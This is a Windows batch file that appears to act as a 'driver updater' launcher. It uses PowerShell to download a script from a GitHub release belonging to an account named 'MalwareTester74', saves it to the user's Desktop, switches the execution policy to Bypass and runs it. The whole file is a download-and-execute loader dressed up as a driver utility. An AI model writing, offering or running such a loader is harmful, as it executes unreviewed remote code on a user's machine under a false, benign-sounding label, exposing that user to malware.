@echo off

REM Download the PowerShell script from the URL to the specified filepath
powershell.exe -Command "& { Invoke-WebRequest 'https://github.com/MalwareTester74/DriverUpdatersDownloader/releases/download/beta/Driver.Updater.Script.0.2.ps1' -OutFile '%USERPROFILE%\Desktop\Driver.Updater.Script.ps1' }"

REM Bypass the execution policy for the downloaded PowerShell script
powershell.exe -Command "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass"

REM Run the downloaded PowerShell script
powershell.exe -File "%USERPROFILE%\Desktop\Driver.Updater.Script.ps1"